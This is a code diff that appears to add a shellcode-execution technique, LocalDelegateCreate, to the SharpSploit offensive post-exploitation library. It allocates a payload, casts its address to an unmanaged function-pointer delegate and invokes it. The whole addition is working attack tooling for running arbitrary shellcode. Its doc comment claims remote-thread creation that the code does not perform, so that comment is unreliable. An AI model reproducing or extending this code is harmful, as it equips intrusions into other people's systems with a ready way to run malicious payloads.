@@ -2,6 +2,7 @@
 using System.Linq;
 using System.Reflection;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 
 namespace SharpSploit.Execution.Injection
 {
@@ -247,4 +248,63 @@ namespace SharpSploit.Execution.Injection
             return true;            
         }
     }
+	
+	public class LocalDelegateCreate : ExecutionTechnique
+    {
+    
+        /// <summary>
+        /// Default constructor.
+        /// </summary>
+        public LocalDelegateCreate()
+        {
+            DefineSupportedPayloadTypes();
+        }
+
+    
+        /// <summary>
+        /// States whether the payload is supported.
+        /// </summary> 
+        /// <param name="Payload">Payload that will be allocated.</param>
+        /// <returns></returns>
+        public override bool IsSupportedPayloadType(PayloadType Payload)
+        {
+            return supportedPayloads.Contains(Payload.GetType());
+        }
+
+        /// <summary>
+        /// Internal method for setting the supported payload types. Used in constructors.
+        /// Update when new types of payloads are added.
+        /// </summary>
+        internal override void DefineSupportedPayloadTypes()
+        {
+            // Defines the set of supported payload types.
+            supportedPayloads = new Type[] {
+                typeof(PICPayload)
+            };
+        }
+
+        public bool Inject(PICPayload Payload, AllocationTechnique AllocationTechnique, Process Process)
+        {
+            IntPtr baseAddr = AllocationTechnique.Allocate(Payload, Process);
+            return Inject(Payload, baseAddr, Process);
+        }
+
+        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
+        private delegate Int32 Initialize();
+
+        /// <summary>
+        /// Create a thread in the remote process.
+        /// </summary>
+        /// <param name="Payload">The shellcode payload to execute in the target process.</param>
+        /// <param name="BaseAddress">The address of the shellcode in the target process.</param>
+        /// <param name="Process">The target process to inject into.</param>
+        /// <returns></returns>        
+        public bool Inject(PICPayload Payload, IntPtr BaseAddress, Process Process)
+        {
+            Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(BaseAddress, typeof(Initialize));
+			del();
+            return true;
+        }
+    }
+	
 }
